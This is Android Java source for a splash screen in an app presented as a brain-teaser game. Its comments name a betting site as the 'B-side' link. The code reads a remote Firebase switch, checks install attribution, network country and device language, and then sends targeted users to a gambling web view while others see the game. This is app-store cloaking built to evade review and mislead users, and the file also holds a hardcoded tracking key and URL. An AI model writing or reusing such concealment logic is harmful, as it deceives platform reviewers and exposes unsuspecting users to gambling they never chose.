package com.mjb.test1;

import static com.mjb.test1.mj_b_mian.AppsFlyerLibUtil.isOrganic;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.mjb.test1.mj_b_mian.AppsFlyerLibUtil;
import com.mjb.test1.mj_b_mian.BWebMainActivity;

import java.util.Locale;

/**
 * com.easybrainteaser.enjoygamefirst
 * KEY：yWCTCzLVDuZYY2sgNuGdDf
 * <p>
 * B面链接：
 * https://www.brlbet2.com/?cid=131947
 * <p>
 * APP名称：
 * Tigre da Inteligência - Fortuna™
 */
public class SplashActivity extends AppCompatActivity {

    String TAG = "SplashActivity";

    private long setDays(long days) {
        return 3600 * 24 * days;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(setDays(30))//本地数据保存至少30天，可以自动定义>30即可
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        //正式版本，用firebase返回参数
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(Task<Boolean> task) {
                        String datas = mFirebaseRemoteConfig.getString("sqdvesw");
                        Log.d(TAG, "datas=" + datas);
                        if (datas.isEmpty()) {
                            startActivity(new Intent(SplashActivity.this, MainActivity.class));
                            finish();
                        } else {
                            url = datas.split("\\+")[0];//"https://rspg.bet"
                            appsflyerkey = datas.split("\\+")[1];
                            jsobjectname = datas.split("\\+")[2];
                            force2B = datas.split("\\+")[3];
                            mlanguage = datas.split("\\+")[4];
                            mcountryiso = datas.split("\\+")[5];
                            Log.d(TAG, "url=" + url);
                            Log.d(TAG, "afkey=" + appsflyerkey);
                            Log.d(TAG, "jsobjectname=" + jsobjectname);
                            Log.d(TAG, "force2B=" + force2B);
                            Log.d(TAG, "mlanguage=" + mlanguage);
                            Log.d(TAG, "mcountryiso=" + mcountryiso);
                            jumpPage();
                        }
                    }
                });

    }

    public static String url = "";
    public static String appsflyerkey = "";
    public static String jsobjectname = "";
    public static String force2B = "";
    public static String mlanguage = "";
    public static String mcountryiso = "";

    private void jumpPage() {
        TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        String countryIso = tm.getNetworkCountryIso();//br、cn
        Locale locale = getResources().getConfiguration().locale;
        String language = locale.getLanguage();//pt、zh、en


        AppsFlyerLibUtil.initAppsFlyer(appsflyerkey);

        Toast.makeText(this, "countryIso=" + countryIso +
                ",language=" + language + ",isOrganic=" + isOrganic, Toast.LENGTH_LONG).show();
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isOrganic &&
                        language.contains(mlanguage) && mcountryiso.contains(countryIso)) {
                    startActivity(new Intent(SplashActivity.this, BWebMainActivity.class));
                } else if (TextUtils.equals(force2B, "1")) {
                    startActivity(new Intent(SplashActivity.this, BWebMainActivity.class));
                } else {
                    startActivity(new Intent(SplashActivity.this, MainActivity.class));
                }
                finish();
            }
        }, 2000);
    }
}